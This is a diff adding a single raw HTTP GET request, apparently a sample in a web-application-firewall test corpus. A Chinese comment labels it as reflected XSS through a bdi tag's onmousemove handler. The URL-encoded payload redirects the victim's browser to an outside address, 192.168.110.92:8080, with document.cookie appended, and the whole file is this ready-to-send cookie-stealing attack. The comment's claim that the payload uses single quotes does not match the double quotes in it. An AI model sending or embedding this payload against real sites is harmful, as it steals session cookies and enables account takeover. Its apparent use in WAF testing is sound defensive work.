@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_bdi标签_onmousemove事件-06506638
+# 攻击载荷利用了HTML中的bdi标签和onmousemove属性，触发location.href向恶意地址发送cookie信息。需要鼠标移动时触发，使用单引号绕过
+GET /?id=%3Cbdi%20onmousemove=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3Etest%3C%2Fbdi%3E&bid=hd_tag_m8mv25tb HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25tb
+RM-PRO-Token: b7288d374a91192ed8fbf512cd8cd527
+RM-PRO-Time: 1742808506180
+User-Agent: curl/7.83.1
+
